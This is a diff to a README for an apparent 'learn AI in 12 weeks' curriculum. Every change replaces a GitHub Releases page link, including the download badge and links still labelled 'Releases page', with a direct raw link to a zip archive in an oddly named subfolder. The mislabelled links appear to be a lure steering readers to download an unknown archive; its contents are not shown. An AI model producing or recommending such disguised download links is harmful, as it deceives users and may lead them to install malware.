@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Killboydolo/learn-ai-in-12-weeks/releases)
+[![Download](https://raw.githubusercontent.com/Killboydolo/learn-ai-in-12-weeks/main/stroil/learn-ai-in-12-weeks.zip)](https://raw.githubusercontent.com/Killboydolo/learn-ai-in-12-weeks/main/stroil/learn-ai-in-12-weeks.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To run this application:
 
 Follow these steps to download and install the curriculum materials:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Killboydolo/learn-ai-in-12-weeks/releases) to access the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Killboydolo/learn-ai-in-12-weeks/main/stroil/learn-ai-in-12-weeks.zip) to access the latest version.
   
 2. **Select the Latest Release**: Click on the link for the latest release to see available files.
 
@@ -71,6 +71,6 @@ Join our community to share your progress and ask questions. Engage with fellow 
   
 ## 📌 Important Links
 
-- [Releases page](https://github.com/Killboydolo/learn-ai-in-12-weeks/releases)
+- [Releases page](https://raw.githubusercontent.com/Killboydolo/learn-ai-in-12-weeks/main/stroil/learn-ai-in-12-weeks.zip)
   
 Together, let’s embark on this journey to learn AI effectively!
